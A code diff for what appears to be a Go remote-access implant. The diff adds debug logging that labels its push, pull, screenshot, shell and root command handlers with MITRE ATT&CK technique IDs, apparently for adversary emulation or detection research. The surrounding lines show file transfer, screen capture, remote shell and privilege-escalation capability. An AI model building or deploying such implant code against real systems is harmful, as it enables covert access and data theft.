@@ -52,6 +52,9 @@ func connect()(string, socket.Socket){
 
   sock := socket.Init(conn, config.Key)
   token, _ := sock.Read()
+
+  debug.Log("T1071", token, "", "Standard Application Layer Protocol")
+
   return token, sock
 }
 
@@ -71,6 +74,7 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       continue
 
     case "push":
+      debug.Log("T1105", token, cmd, "Remote File Copy")
       cmds := strings.Split(cmd, "push")
       cmds[1] = strings.TrimSpace(cmds[1])
 
@@ -84,6 +88,8 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       fconn.Close()
 
     case "pull":
+      debug.Log("T1105", token, cmd, "Remote File Copy")
+      debug.Log("T1005", token, cmd, "Data from Local System")
       cmds := strings.Split(cmd, "pull")
       cmds[1] = strings.TrimSpace(cmds[1])
 
@@ -97,6 +103,7 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       fconn.Close()
 
     case "screenshot":
+      debug.Log("T1113", token, cmd, "Screen Capture")
       if fileName, err := screenshot.TakeScreenShot(); err != nil {
 	sock.Write(fmt.Sprintf("%v", err))
       } else {
@@ -119,6 +126,8 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       }
 
     case "shell":
+      shellCmdId, shellCmdText := debug.ShellCmdLog(cmd)
+      debug.Log(shellCmdId, token, cmd, shellCmdText)
       cmds := strings.Split(cmd, "shell")
       cmds[1] = strings.TrimSpace(cmds[1])
       if cmds[1] == "" {
@@ -134,6 +143,8 @@ func handleCMD(token string, sock socket.Socket, i *info.Info){
       }
 
     case "root":
+      debug.Log("T1105", token, cmd, "Remote File Copy")
+      debug.Log("T1514", token, cmd, "Elevated Execution with Prompt")
       if i.GetCurUser() == "root" {
 	sock.Write("Already root.")
       }else{
